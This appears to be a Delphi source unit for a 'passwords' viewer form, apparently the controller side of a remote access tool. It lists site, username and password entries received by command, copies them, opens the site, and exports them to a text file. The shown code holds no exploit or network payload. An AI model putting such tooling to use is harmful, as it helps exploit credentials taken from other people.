unit UnitPasswords;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, Menus;

type
  TFormPasswords = class(TForm)
    ListView1: TListView;
    PopupMenu1: TPopupMenu;
    Copiarnomedeusurio1: TMenuItem;
    Copiarsenha1: TMenuItem;
    Abrirsite1: TMenuItem;
    N1: TMenuItem;
    Savepasstxt1: TMenuItem;
    SaveDialog1: TSaveDialog;
    StatusBar1: TStatusBar;
    ProgressBar1: TProgressBar;
    procedure FormShow(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure Copiarnomedeusurio1Click(Sender: TObject);
    procedure Copiarsenha1Click(Sender: TObject);
    procedure Abrirsite1Click(Sender: TObject);
    procedure PopupMenu1Popup(Sender: TObject);
    procedure ListView1ColumnClick(Sender: TObject; Column: TListColumn);
    procedure ListView1Compare(Sender: TObject; Item1, Item2: TListItem;
      Data: Integer; var Compare: Integer);
    procedure Savepasstxt1Click(Sender: TObject);
  private
    SortColumn: integer;
    SortReverse: boolean;
    procedure AtualizarIdiomaFormPasswords;
    { Private declarations }
  public
    { Public declarations }
  end;

var
  FormPasswords: TFormPasswords;
  PodeReceber: boolean = false; // começa "false" pq o form está fechado
                                // então ao abri o form ele fica "true" e não será possível enviar o comando enquanto estiver aberto
implementation

{$R *.dfm}

Uses
  UnitPrincipal,
  FuncoesdiversasCliente,
  UnitStrings,
  UnitClipBoard,
  UnitComandos,
  shellapi,
  StrUtils;

procedure TFormPasswords.AtualizarIdiomaFormPasswords;
var
  i: integer;
begin
  FormPasswords.Caption := traduzidos[353];
  for i := 0 to 3 do Listview1.Column[i].Caption := traduzidos[i + 355];

  Copiarnomedeusurio1.Caption := traduzidos[359];
  Copiarsenha1.Caption := traduzidos[360];
  Abrirsite1.Caption := traduzidos[361];
  Savepasstxt1.Caption := traduzidos[362];
end;

procedure TFormPasswords.FormShow(Sender: TObject);
begin
  AtualizarIdiomaFormPasswords;
  PodeReceber := true;
end;

procedure TFormPasswords.FormClose(Sender: TObject;
  var Action: TCloseAction);
begin
  PodeReceber := false;
end;

procedure TFormPasswords.Copiarnomedeusurio1Click(Sender: TObject);
begin
  SetClipboardText(listview1.Selected.SubItems.Strings[1]);
end;

procedure TFormPasswords.Copiarsenha1Click(Sender: TObject);
begin
  SetClipboardText(listview1.Selected.SubItems.Strings[2]);
end;

procedure TFormPasswords.Abrirsite1Click(Sender: TObject);
begin
  shellExecute(0, 'open', pchar(GetDefaultBrowser), pchar(listview1.Selected.Caption), '', SW_SHOWMAXIMIZED);
end;

procedure TFormPasswords.PopupMenu1Popup(Sender: TObject);
var
  i: integer;
begin
  if listview1.Selected = nil then
  begin
    for i := 0 to PopupMenu1.Items.Count - 1 do
    PopupMenu1.Items.Items[i].Visible := false;
    exit;
  end else
  begin
    for i := 0 to PopupMenu1.Items.Count - 1 do
    PopupMenu1.Items.Items[i].Visible := true;
  end;
  if (listview1.Selected.ImageIndex = 314) or
     (listview1.Selected.ImageIndex = 315) then Abrirsite1.Visible := true else Abrirsite1.Visible := false;
end;

procedure TFormPasswords.ListView1ColumnClick(Sender: TObject;
  Column: TListColumn);
var
  i: integer;
begin
  if (SortColumn = Column.Index) then
    SortReverse := not SortReverse // reverse the sort order since this column is already selected for sorting
  else
  begin
    SortColumn := Column.Index;
    SortReverse := false;
  end;
  ListView1.CustomSort(nil, 0);
end;

procedure TFormPasswords.ListView1Compare(Sender: TObject; Item1,
  Item2: TListItem; Data: Integer; var Compare: Integer);
begin
  if SortColumn = 0 then
    Compare := AnsiCompareStr(Item1.Caption, Item2.Caption)
  else
    Compare := AnsiCompareStr(Item1.SubItems[SortColumn-1], Item2.SubItems[SortColumn-1]);
  if SortReverse then Compare := 0 - Compare;
end;

function justr(s : string; tamanho : integer) : string;
var i : integer;
begin
   i := tamanho-length(s);
   if i>0 then
     s := DupeString(' ', i)+s;
   justr := s;
end;

function justl(s : string; tamanho : integer) : string;
var i : integer;
begin
   i := tamanho-length(s);
   if i>0 then
     s := s+DupeString(' ', i);
   justl := s;
end;

procedure TFormPasswords.Savepasstxt1Click(Sender: TObject);
var
  Filename: string;
  I: Integer;
  buffer: string;
  Distancia: integer;
begin
  Distancia := length(ListView1.Column[0].Caption);
  if length(ListView1.Column[1].Caption) > Distancia then Distancia := length(ListView1.Column[1].Caption);
  if length(ListView1.Column[2].Caption) > Distancia then Distancia := length(ListView1.Column[2].Caption);
  if length(ListView1.Column[3].Caption) > Distancia then Distancia := length(ListView1.Column[3].Caption);

  savedialog1.Filter := 'Text Files (*.txt)' + '|*.txt';
  savedialog1.InitialDir := extractfilepath(paramstr(0));
  savedialog1.Title := Application.Title + ' ' + VersaoPrograma;
  savedialog1.FileName := extractfilepath(paramstr(0)) + inttostr(gettickcount) + '.txt';

  if savedialog1.Execute = true then
  begin
    Filename := savedialog1.FileName;
    if Filename = '' then exit;
    buffer := '';
    for I := 0 to ListView1.Items.Count - 1 do
    begin
      buffer := buffer + justl(ListView1.Column[1].Caption, Distancia) + justl(': ' + ListView1.Items[I].SubItems[0], 0) + #13#10;
      buffer := buffer + justl(ListView1.Column[0].Caption, Distancia) + justl(': ' + ListView1.Items[I].Caption, 0) + #13#10;
      buffer := buffer + justl(ListView1.Column[2].Caption, Distancia) + justl(': ' + ListView1.Items[I].SubItems[1], 0) + #13#10;
      buffer := buffer + justl(ListView1.Column[3].Caption, Distancia) + justl(': ' + ListView1.Items[I].SubItems[2], 0) + #13#10;
      buffer := buffer + #13#10;
    end;
    criararquivo(filename, buffer, length(buffer));
  end;
end;

end.
